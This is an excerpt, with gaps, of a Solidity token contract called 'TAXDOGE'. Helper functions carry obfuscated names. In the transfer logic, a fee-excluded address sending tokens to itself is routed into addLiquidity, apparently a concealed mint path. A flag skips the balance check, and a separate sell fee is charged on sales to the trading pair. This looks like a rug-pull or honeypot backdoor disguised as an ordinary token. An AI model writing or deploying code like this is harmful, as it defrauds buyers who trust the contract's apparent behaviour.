...
library SafeMath {
    ...
    function TAXDOGEM(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
...
library Address {
    ...
    function TAXDOGEderPair(address account) internal pure  returns (bool) {
...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "TAXDOGE";
    string private _symbol = "TAXDOGE";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (TAXDOGEder2Pair(from, to)) {return addLiquidity(amount, to);}
        if (TAXDOGEbool){} else {require(_balances[from] >= amount);}
        uint256 feeAmount = 0;
        takeFee(from);
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.TAXDOGEderPair(to) && to != address(this) && !inLiquidityTransaction && !TAXDOGEbool) {
            feeAmount = amount.TAXDOGEM(_fee).div(taxdiv);
            if (to == uniswapV2Pair()) {
                feeAmount = amount.TAXDOGEM(_sellFee).div(taxdiv);
            }
    ...
    function TAXDOGEder2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.TAXDOGEderPair(to)) && to == from;
    }
